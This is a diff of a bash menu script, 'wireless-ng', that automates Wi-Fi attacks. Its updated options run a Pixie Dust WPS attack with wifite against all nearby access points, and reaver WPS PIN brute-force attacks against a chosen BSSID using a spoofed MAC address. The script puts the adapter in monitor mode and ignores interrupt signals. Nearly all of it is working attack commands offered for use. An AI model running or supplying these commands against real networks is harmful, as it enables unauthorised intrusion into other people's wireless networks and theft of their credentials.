@@ -1,5 +1,5 @@
 #!/bin/bash
-# wireless-ng, version 1.01
+# wireless-ng, version 1.10
 
 # Warning :
 # ----------
@@ -24,36 +24,60 @@ pause() {
 	fackEnterKey
 }
 
-one() {
-	echo "You have selected choice $choice."
-	sleep 4
-	clear
+scan() {
 	ifconfig wlan1 down
+	iw reg set US
+	iwconfig wlan1 txpower 20
+	iwconfig wlan1 mode managed
+	ifconfig wlan1 up
+}
+
+monitor() {
+	ifconfig wlan1 down
+	iw reg set US
+	iwconfig wlan1 txpower 20
 	iwconfig wlan1 mode monitor
 	ifconfig wlan1 up
-	echo "Wireless adapter succesfully turned 'ON'."
-	sleep 4
+}
+
+one() {
+	echo "You have selected choice $choice."
+	sleep 2
+	clear
+	monitor
+	wifite --all --mac --pixie
+	ifconfig wlan1 down
+	pause
+	
 }
 
 two() {
 	echo "You have selected choice $choice."
-	sleep 4
+	sleep 2
 	clear
-	echo "Please enter BSSID(name) : "
-	read name
-	reaver -i wlan1 -a -f -c 1 -e $name -r 3:30 -E -S -vv -N -T 1 -t 20 -d 0 -l 420 --mac=9e:49:1f:d6:37:f4
+	scan
+	iwlist wlan1 scan | grep -E 'Address|ESSID'
+	sleep 2
+	echo "Please enter BSSID from above : "
+	read BSSID
+	monitor
+	reaver -i wlan1 -a -f -c 1 -b $BSSID -r 3:30 -E -S -vv -N -T 1 -t 20 -d 0 -l 420 --mac=9e:49:1f:d6:37:f4
+	ifconfig wlan1 down # Switch off
 	pause
 }
 
 three() {
 	echo "You have selected choice $choice."
-	sleep 4
+	sleep 2
 	clear
-	echo "Please enter BSSID(name) : "
-	read name
+	scan
+	iwlist wlan1 scan | grep -E 'Address|ESSID'
+	echo "Please enter BSSID from above : "
+	read BSSID
 	echo "Please enter the PIN : "
 	read PIN
-	reaver -i wlan1 -a -f -c 1 -e $name -r 3:30 -E -s -vv -N -T 1 -t 20 -d 0 -l 420 --mac=9e:49:1f:d6:37:f4 --pin=$PIN
+	reaver -i wlan1 -a -f -c 1 -e $BSSID -r 3:30 -E -s -vv -N -T 1 -t 20 -d 0 -l 420 --mac=9e:49:1f:d6:37:f4 --pin=$PIN
+	ifconfig wlan1 down # Switch off
 	pause
 }
 
@@ -61,7 +85,7 @@ three() {
 menu() {
 	clear
 	echo "MENU :"
-	echo "1. Turn on wireless adapter."
+	echo "1. Pixiedust attack on all nearby access points."
 	echo "2. Do a fresh PIN attack."
 	echo "3. Do a used PIN attack."
 	echo "4. Exit."
@@ -80,6 +104,7 @@ input() {
 }
 
 # Trap CTRL+C, CTRL+Z and quit singles
+
 trap '' SIGINT SIGQUIT SIGTSTP
 
 # MAIN
